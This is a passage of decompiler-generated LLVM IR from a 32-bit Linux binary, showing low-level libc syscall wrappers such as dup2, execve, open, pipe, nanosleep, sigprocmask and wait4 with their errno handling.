  store i32 %v0_804f11c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f12f = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_804f12f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804f12f, -4095
  br i1 %tmp8, label %dec_label_pc_804f148, label %dec_label_pc_804f13c

dec_label_pc_804f13c:                             ; preds = %dec_label_pc_804f11c
  %v0_804f13c = load i32, i32* %stack_var_-4, align 4
  %v1_804f13c = call i32 @function_804b4bc(i32 %v0_804f13c)
  %v0_804f141 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f141 = sub i32 0, %v0_804f141
  %v2_804f143 = inttoptr i32 %v1_804f13c to i32*
  store i32 %v1_804f141, i32* %v2_804f143, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f148

dec_label_pc_804f148:                             ; preds = %dec_label_pc_804f11c, %dec_label_pc_804f13c
  %v0_804f148 = phi i32 [ %v2_804f12f, %dec_label_pc_804f11c ], [ -1, %dec_label_pc_804f13c ]
  %v2_804f14c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f14c, i32* @ebx, align 4
  ret i32 %v0_804f148

; uselistorder directives
  uselistorder i32 %v2_804f12f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f148, { 1, 0 }
}

define i32 @function_804f150(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f150:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f150 = load i32, i32* @edi, align 4
  store i32 %v0_804f150, i32* %stack_var_-4, align 4
  %v4_804f154 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f154, i32* %edi.global-to-local, align 4
  %v0_804f160 = load i32, i32* @ebx, align 4
  %v5_804f168 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_804f168 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_804f168 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_804f168, [1 x i8*] %v8_804f168)
  store i32 %v9_804f168, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_804f168, -4095
  br i1 %tmp12, label %dec_label_pc_804f180, label %dec_label_pc_804f174

dec_label_pc_804f174:                             ; preds = %dec_label_pc_804f150
  %v1_804f174 = call i32 @function_804b4bc(i32 %v0_804f160)
  %v0_804f179 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f179 = sub i32 0, %v0_804f179
  %v2_804f17b = inttoptr i32 %v1_804f174 to i32*
  store i32 %v1_804f179, i32* %v2_804f17b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f180

dec_label_pc_804f180:                             ; preds = %dec_label_pc_804f150, %dec_label_pc_804f174
  %v0_804f180 = phi i32 [ %v9_804f168, %dec_label_pc_804f150 ], [ -1, %dec_label_pc_804f174 ]
  %v2_804f184 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f184, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f180

; uselistorder directives
  uselistorder i32 %v9_804f168, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f180, { 1, 0 }
}

define i32 @function_804f188() local_unnamed_addr {
dec_label_pc_804f188:
  %stack_var_-8 = alloca i32, align 4
  %v2_804f18b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804f192 = call i32 @function_804f23c(i32 7, i32 %v2_804f18b)
  store i32 256, i32* @edx, align 4
  %v2_804f19f = icmp slt i32 %v2_804f192, 0
  br i1 %v2_804f19f, label %dec_label_pc_804f1a7, label %dec_label_pc_804f1a3

dec_label_pc_804f1a3:                             ; preds = %dec_label_pc_804f188
  %v3_804f1a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804f1a3, i32* @edx, align 4
  br label %dec_label_pc_804f1a7

dec_label_pc_804f1a7:                             ; preds = %dec_label_pc_804f188, %dec_label_pc_804f1a3
  %v0_804f1a7 = phi i32 [ 256, %dec_label_pc_804f188 ], [ %v3_804f1a3, %dec_label_pc_804f1a3 ]
  ret i32 %v0_804f1a7

; uselistorder directives
  uselistorder label %dec_label_pc_804f1a7, { 1, 0 }
}

define i32 @function_804f1b0() local_unnamed_addr {
dec_label_pc_804f1b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f1b0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f1b0, i32* %stack_var_-4, align 4
  %v1_804f1b9 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804f1b9, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f1b9, -4095
  br i1 %tmp6, label %dec_label_pc_804f1d0, label %dec_label_pc_804f1c4

dec_label_pc_804f1c4:                             ; preds = %dec_label_pc_804f1b0
  %v0_804f1c4 = load i32, i32* %stack_var_-4, align 4
  %v1_804f1c4 = call i32 @function_804b4bc(i32 %v0_804f1c4)
  %v0_804f1c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1c9 = sub i32 0, %v0_804f1c9
  %v2_804f1cb = inttoptr i32 %v1_804f1c4 to i32*
  store i32 %v1_804f1c9, i32* %v2_804f1cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f1d0

dec_label_pc_804f1d0:                             ; preds = %dec_label_pc_804f1b0, %dec_label_pc_804f1c4
  %v0_804f1d0 = phi i32 [ %v1_804f1b9, %dec_label_pc_804f1b0 ], [ -1, %dec_label_pc_804f1c4 ]
  %v2_804f1d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f1d4, i32* @ebx, align 4
  ret i32 %v0_804f1d0

; uselistorder directives
  uselistorder i32 %v1_804f1b9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f1d0, { 1, 0 }
}

define i32 @function_804f1d8() local_unnamed_addr {
dec_label_pc_804f1d8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f1d8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f1d8, i32* %stack_var_-4, align 4
  %v1_804f1e1 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804f1e1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f1e1, -4095
  br i1 %tmp6, label %dec_label_pc_804f1f8, label %dec_label_pc_804f1ec

dec_label_pc_804f1ec:                             ; preds = %dec_label_pc_804f1d8
  %v0_804f1ec = load i32, i32* %stack_var_-4, align 4
  %v1_804f1ec = call i32 @function_804b4bc(i32 %v0_804f1ec)
  %v0_804f1f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1f1 = sub i32 0, %v0_804f1f1
  %v2_804f1f3 = inttoptr i32 %v1_804f1ec to i32*
  store i32 %v1_804f1f1, i32* %v2_804f1f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f1f8

dec_label_pc_804f1f8:                             ; preds = %dec_label_pc_804f1d8, %dec_label_pc_804f1ec
  %v0_804f1f8 = phi i32 [ %v1_804f1e1, %dec_label_pc_804f1d8 ], [ -1, %dec_label_pc_804f1ec ]
  %v2_804f1fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f1fc, i32* @ebx, align 4
  ret i32 %v0_804f1f8

; uselistorder directives
  uselistorder i32 %v1_804f1e1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f1f8, { 1, 0 }
}

define i32 @function_804f200() local_unnamed_addr {
dec_label_pc_804f200:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f200 = load i32, i32* @ebx, align 4
  store i32 %v0_804f200, i32* %stack_var_-4, align 4
  %v1_804f209 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804f209, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f209, -4095
  br i1 %tmp6, label %dec_label_pc_804f220, label %dec_label_pc_804f214

dec_label_pc_804f214:                             ; preds = %dec_label_pc_804f200
  %v0_804f214 = load i32, i32* %stack_var_-4, align 4
  %v1_804f214 = call i32 @function_804b4bc(i32 %v0_804f214)
  %v0_804f219 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f219 = sub i32 0, %v0_804f219
  %v2_804f21b = inttoptr i32 %v1_804f214 to i32*
  store i32 %v1_804f219, i32* %v2_804f21b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f220

dec_label_pc_804f220:                             ; preds = %dec_label_pc_804f200, %dec_label_pc_804f214
  %v0_804f220 = phi i32 [ %v1_804f209, %dec_label_pc_804f200 ], [ -1, %dec_label_pc_804f214 ]
  %v2_804f224 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f224, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f220

; uselistorder directives
  uselistorder i32 %v1_804f209, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f220, { 1, 0 }
}

define i32 @function_804f228() local_unnamed_addr {
dec_label_pc_804f228:
  %v0_804f228 = load i32, i32* @global_var_80580b0.179, align 16
  %v1_804f232 = icmp eq i32 %v0_804f228, 0
  br i1 %v1_804f232, label %dec_label_pc_804f238, label %dec_label_pc_804f236

dec_label_pc_804f236:                             ; preds = %dec_label_pc_804f228
  br label %dec_label_pc_804f238

dec_label_pc_804f238:                             ; preds = %dec_label_pc_804f228, %dec_label_pc_804f236
  %storemerge = phi i32 [ %v0_804f228, %dec_label_pc_804f236 ], [ 4096, %dec_label_pc_804f228 ]
  %v0_804f238 = phi i32 [ %v0_804f228, %dec_label_pc_804f236 ], [ 4096, %dec_label_pc_804f228 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804f238

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 10, 11, 4, 9, 7, 8, 5, 3, 6, 2 }
  uselistorder label %dec_label_pc_804f238, { 1, 0 }
}

define i32 @function_804f23c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f23c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f23c = load i32, i32* @ebx, align 4
  store i32 %v0_804f23c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f24f = call i32 @int80_syscall(i32 191)
  store i32 %v1_804f24f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804f24f, -4095
  br i1 %tmp8, label %dec_label_pc_804f268, label %dec_label_pc_804f25c

dec_label_pc_804f25c:                             ; preds = %dec_label_pc_804f23c
  %v0_804f25c = load i32, i32* %stack_var_-4, align 4
  %v1_804f25c = call i32 @function_804b4bc(i32 %v0_804f25c)
  %v0_804f261 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f261 = sub i32 0, %v0_804f261
  %v2_804f263 = inttoptr i32 %v1_804f25c to i32*
  store i32 %v1_804f261, i32* %v2_804f263, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f268

dec_label_pc_804f268:                             ; preds = %dec_label_pc_804f23c, %dec_label_pc_804f25c
  %v0_804f268 = phi i32 [ %v1_804f24f, %dec_label_pc_804f23c ], [ -1, %dec_label_pc_804f25c ]
  %v2_804f26c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f26c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f268

; uselistorder directives
  uselistorder i32 %v1_804f24f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f268, { 1, 0 }
}

define i32 @function_804f270() local_unnamed_addr {
dec_label_pc_804f270:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f270 = load i32, i32* @ebx, align 4
  store i32 %v0_804f270, i32* %stack_var_-4, align 4
  %v1_804f279 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804f279, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804f279, -4095
  br i1 %tmp6, label %dec_label_pc_804f290, label %dec_label_pc_804f284

dec_label_pc_804f284:                             ; preds = %dec_label_pc_804f270
  %v0_804f284 = load i32, i32* %stack_var_-4, align 4
  %v1_804f284 = call i32 @function_804b4bc(i32 %v0_804f284)
  %v0_804f289 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f289 = sub i32 0, %v0_804f289
  %v2_804f28b = inttoptr i32 %v1_804f284 to i32*
  store i32 %v1_804f289, i32* %v2_804f28b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f290

dec_label_pc_804f290:                             ; preds = %dec_label_pc_804f270, %dec_label_pc_804f284
  %v0_804f290 = phi i32 [ %v1_804f279, %dec_label_pc_804f270 ], [ -1, %dec_label_pc_804f284 ]
  %v2_804f294 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f294, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f290

; uselistorder directives
  uselistorder i32 %v1_804f279, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f290, { 1, 0 }
}

define i32 @function_804f298(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f298:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f298 = load i32, i32* @ebx, align 4
  store i32 %v0_804f298, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_804f2ab = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_804f2ab, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804f2ab, -4095
  br i1 %tmp9, label %dec_label_pc_804f2c4, label %dec_label_pc_804f2b8

dec_label_pc_804f2b8:                             ; preds = %dec_label_pc_804f298
  %v0_804f2b8 = load i32, i32* %stack_var_-4, align 4
  %v1_804f2b8 = call i32 @function_804b4bc(i32 %v0_804f2b8)
  %v0_804f2bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f2bd = sub i32 0, %v0_804f2bd
  %v2_804f2bf = inttoptr i32 %v1_804f2b8 to i32*
  store i32 %v1_804f2bd, i32* %v2_804f2bf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f2c4

dec_label_pc_804f2c4:                             ; preds = %dec_label_pc_804f298, %dec_label_pc_804f2b8
  %v0_804f2c4 = phi i32 [ %v3_804f2ab, %dec_label_pc_804f298 ], [ -1, %dec_label_pc_804f2b8 ]
  %v2_804f2c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f2c6, i32* @edx, align 4
  %v2_804f2c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f2c8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f2c4

; uselistorder directives
  uselistorder i32 %v3_804f2ab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f2c4, { 1, 0 }
}

define i32 @function_804f2cc(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f2cc:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_804f2cc = load i32, i32* @ebx, align 4
  store i32 %v0_804f2cc, i32* %stack_var_-4, align 4
  %v4_804f2d0 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804f2d0, i32* %ebx.global-to-local, align 4
  %v6_804f2df = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_804f2df, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_804f2df, -4095
  br i1 %tmp10, label %dec_label_pc_804f2f8, label %dec_label_pc_804f2ec

dec_label_pc_804f2ec:                             ; preds = %dec_label_pc_804f2cc
  %v0_804f2ec = load i32, i32* %stack_var_-4, align 4
  %v1_804f2ec = call i32 @function_804b4bc(i32 %v0_804f2ec)
  %v0_804f2f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f2f1 = sub i32 0, %v0_804f2f1
  %v2_804f2f3 = inttoptr i32 %v1_804f2ec to i32*
  store i32 %v1_804f2f1, i32* %v2_804f2f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f2f8

dec_label_pc_804f2f8:                             ; preds = %dec_label_pc_804f2cc, %dec_label_pc_804f2ec
  %v0_804f2f8 = phi i32 [ %v6_804f2df, %dec_label_pc_804f2cc ], [ -1, %dec_label_pc_804f2ec ]
  %v2_804f2fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f2fc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804f2f8

; uselistorder directives
  uselistorder i32 %v6_804f2df, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f8, { 1, 0 }
}

define i32 @function_804f300(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f300:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f301 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804f307 = sdiv i32 %sext, 16777216
  store i32 %v4_804f307, i32* @ecx, align 4
  %v4_804f30b = ptrtoint i8* %arg1 to i32
  %v3_804f30f = and i32 %arg2, 64
  %v4_804f30f = icmp eq i32 %v3_804f30f, 0
  br i1 %v4_804f30f, label %dec_label_pc_804f320, label %dec_label_pc_804f314

dec_label_pc_804f314:                             ; preds = %dec_label_pc_804f300
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804f320

dec_label_pc_804f320:                             ; preds = %dec_label_pc_804f300, %dec_label_pc_804f314
  %v0_804f320 = phi i32 [ 0, %dec_label_pc_804f300 ], [ %phitmp, %dec_label_pc_804f314 ]
  store i32 %v0_804f320, i32* @edx, align 4
  store i32 %v4_804f30b, i32* %ebx.global-to-local, align 4
  %v5_804f32b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804f307)
  store i32 %v5_804f32b, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804f32b, -4095
  br i1 %tmp15, label %dec_label_pc_804f343, label %dec_label_pc_804f337

dec_label_pc_804f337:                             ; preds = %dec_label_pc_804f320
  %v1_804f337 = call i32 @function_804b4bc(i32 %v0_804f301)
  %v0_804f33c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f33c = sub i32 0, %v0_804f33c
  %v2_804f33e = inttoptr i32 %v1_804f337 to i32*
  store i32 %v1_804f33c, i32* %v2_804f33e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f343

dec_label_pc_804f343:                             ; preds = %dec_label_pc_804f320, %dec_label_pc_804f337
  %v0_804f343 = phi i32 [ %v5_804f32b, %dec_label_pc_804f320 ], [ -1, %dec_label_pc_804f337 ]
  store i32 %v0_804f301, i32* @ebx, align 4
  ret i32 %v0_804f343

; uselistorder directives
  uselistorder i32 %v5_804f32b, { 1, 0, 2 }
  uselistorder i32 %v4_804f307, { 1, 0 }
  uselistorder i32 %v0_804f301, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f343, { 1, 0 }
  uselistorder label %dec_label_pc_804f320, { 1, 0 }
}

define i32 @function_804f34b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f34b:
  %v3_804f35b = inttoptr i32 %arg1 to i8*
  %v4_804f35b = call i32 @function_804f300(i8* %v3_804f35b, i32 577, i32 %arg2)
  ret i32 %v4_804f35b

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @function_804f300, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
}

define i32 @function_804f364(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f364:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f364 = load i32, i32* @edi, align 4
  store i32 %v0_804f364, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804f36c = load i32, i32* @ebx, align 4
  %v1_804f374 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804f374 = call i32 @pipe([2 x i32] %v1_804f374)
  store i32 %v0_804f36c, i32* @ebx, align 4
  store i32 %v2_804f374, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804f374, -4095
  br i1 %tmp8, label %dec_label_pc_804f38c, label %dec_label_pc_804f380

dec_label_pc_804f380:                             ; preds = %dec_label_pc_804f364
  %v1_804f380 = call i32 @function_804b4bc(i32 %v0_804f36c)
  %v0_804f385 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f385 = sub i32 0, %v0_804f385
  %v2_804f387 = inttoptr i32 %v1_804f380 to i32*
  store i32 %v1_804f385, i32* %v2_804f387, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f38c

dec_label_pc_804f38c:                             ; preds = %dec_label_pc_804f364, %dec_label_pc_804f380
  %v0_804f38c = phi i32 [ %v2_804f374, %dec_label_pc_804f364 ], [ -1, %dec_label_pc_804f380 ]
  %v2_804f390 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f390, i32* @edi, align 4
  ret i32 %v0_804f38c

; uselistorder directives
  uselistorder i32 %v2_804f374, { 1, 0, 2 }
  uselistorder i32 %v0_804f36c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f38c, { 1, 0 }
}

define i32 @function_804f394(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f394:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f395 = load i32, i32* @ebx, align 4
  %v0_804f399 = load i32, i32* @global_var_80580e4.184, align 4
  %v1_804f399 = icmp eq i32 %v0_804f399, 0
  %v1_804f3a4 = icmp eq i1 %v1_804f399, false
  br i1 %v1_804f3a4, label %dec_label_pc_804f3b7, label %dec_label_pc_804f3a6

dec_label_pc_804f3a6:                             ; preds = %dec_label_pc_804f394
  %v1_804f3ab = call i32 @function_8050c7c(i32 0)
  %v2_804f3b3 = icmp slt i32 %v1_804f3ab, 0
  br i1 %v2_804f3b3, label %dec_label_pc_804f3d9, label %dec_label_pc_804f3a6.dec_label_pc_804f3b7_crit_edge

dec_label_pc_804f3a6.dec_label_pc_804f3b7_crit_edge: ; preds = %dec_label_pc_804f3a6
  %v0_804f3b9.pre = load i32, i32* @global_var_80580e4.184, align 4
  br label %dec_label_pc_804f3b7

dec_label_pc_804f3b7:                             ; preds = %dec_label_pc_804f3a6.dec_label_pc_804f3b7_crit_edge, %dec_label_pc_804f394
  %v0_804f3c7 = phi i32 [ %v0_804f3b9.pre, %dec_label_pc_804f3a6.dec_label_pc_804f3b7_crit_edge ], [ %v0_804f399, %dec_label_pc_804f394 ]
  %v1_804f3b7 = icmp eq i32 %arg1, 0
  %v1_804f3be = icmp eq i1 %v1_804f3b7, false
  br i1 %v1_804f3be, label %dec_label_pc_804f3c4, label %dec_label_pc_804f3c0

dec_label_pc_804f3c0:                             ; preds = %dec_label_pc_804f3b7
  br label %dec_label_pc_804f3dc

dec_label_pc_804f3c4:                             ; preds = %dec_label_pc_804f3b7
  store i32 %v0_804f3c7, i32* @ebx, align 4
  %v2_804f3c9 = add i32 %v0_804f3c7, %arg1
  %v1_804f3cd = call i32 @function_8050c7c(i32 %v2_804f3c9)
  %v2_804f3d5 = icmp slt i32 %v1_804f3cd, 0
  %v1_804f3d7 = icmp eq i1 %v2_804f3d5, false
  br i1 %v1_804f3d7, label %dec_label_pc_804f3c4.dec_label_pc_804f3dc_crit_edge, label %dec_label_pc_804f3d9

dec_label_pc_804f3c4.dec_label_pc_804f3dc_crit_edge: ; preds = %dec_label_pc_804f3c4
  %v0_804f3dc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f3dc

dec_label_pc_804f3d9:                             ; preds = %dec_label_pc_804f3c4, %dec_label_pc_804f3a6
  br label %dec_label_pc_804f3dc

dec_label_pc_804f3dc:                             ; preds = %dec_label_pc_804f3c4.dec_label_pc_804f3dc_crit_edge, %dec_label_pc_804f3c0, %dec_label_pc_804f3d9
  %v0_804f3dc = phi i32 [ %v0_804f3dc.pre, %dec_label_pc_804f3c4.dec_label_pc_804f3dc_crit_edge ], [ %v0_804f3c7, %dec_label_pc_804f3c0 ], [ -1, %dec_label_pc_804f3d9 ]
  %v2_804f3de = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f3de, i32* @edx, align 4
  store i32 %v0_804f395, i32* @ebx, align 4
  ret i32 %v0_804f3dc

; uselistorder directives
  uselistorder i32 %v0_804f3c7, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8050c7c, { 1, 0 }
  uselistorder label %dec_label_pc_804f3dc, { 2, 0, 1 }
}

define i32 @function_804f3e4(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f3e4:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804f3e5 = load i32, i32* @esi, align 4
  %v4_804f3e9 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804f3e9, i32* @ecx, align 4
  %v2_804f3f5 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804f3f5, label %dec_label_pc_804f40e, label %dec_label_pc_804f3f9

dec_label_pc_804f3f9:                             ; preds = %dec_label_pc_804f3e4
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804f40e, label %dec_label_pc_804f3fe

dec_label_pc_804f3fe:                             ; preds = %dec_label_pc_804f3f9
  %v1_804f3fe = call i32 @function_804b4bc(i32 %v0_804f3e5)
  %v1_804f403 = inttoptr i32 %v1_804f3fe to i32*
  store i32 22, i32* %v1_804f403, align 4
  br label %dec_label_pc_804f435

dec_label_pc_804f40e:                             ; preds = %dec_label_pc_804f3f9, %dec_label_pc_804f3e4
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804f413 = load i32, i32* @ebx, align 4
  %v7_804f41b = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804f413, i32* @ebx, align 4
  store i32 %v7_804f41b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804f41b, -4095
  br i1 %tmp12, label %dec_label_pc_804f435, label %dec_label_pc_804f427

dec_label_pc_804f427:                             ; preds = %dec_label_pc_804f40e
  %v1_804f427 = call i32 @function_804b4bc(i32 %v0_804f413)
  %v0_804f42c = load i32, i32* %esi.global-to-local, align 4
  %v1_804f42c = sub i32 0, %v0_804f42c
  %v2_804f42e = inttoptr i32 %v1_804f427 to i32*
  store i32 %v1_804f42c, i32* %v2_804f42e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f435

dec_label_pc_804f435:                             ; preds = %dec_label_pc_804f427, %dec_label_pc_804f40e, %dec_label_pc_804f3fe
  %storemerge = phi i32 [ -1, %dec_label_pc_804f3fe ], [ %v7_804f41b, %dec_label_pc_804f40e ], [ -1, %dec_label_pc_804f427 ]
  %v2_804f435 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f435, i32* @edx, align 4
  store i32 %v0_804f3e5, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804f41b, { 1, 0, 2 }
  uselistorder i32 %v0_804f413, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804f43c(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_804f43c:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f43d = load i32, i32* @esi, align 4
  store i32 %v0_804f43d, i32* %stack_var_-8, align 4
  %v4_804f44d = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_804f44d, i32* %esi.global-to-local, align 4
  %v0_804f451 = load i32, i32* @ebx, align 4
  %v6_804f459 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_804f451, i32* @ebx, align 4
  store i32 %v6_804f459, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_804f459, -4095
  br i1 %tmp11, label %dec_label_pc_804f471, label %dec_label_pc_804f465

dec_label_pc_804f465:                             ; preds = %dec_label_pc_804f43c
  %v1_804f465 = call i32 @function_804b4bc(i32 %v0_804f451)
  %v0_804f46a = load i32, i32* %esi.global-to-local, align 4
  %v1_804f46a = sub i32 0, %v0_804f46a
  %v2_804f46c = inttoptr i32 %v1_804f465 to i32*
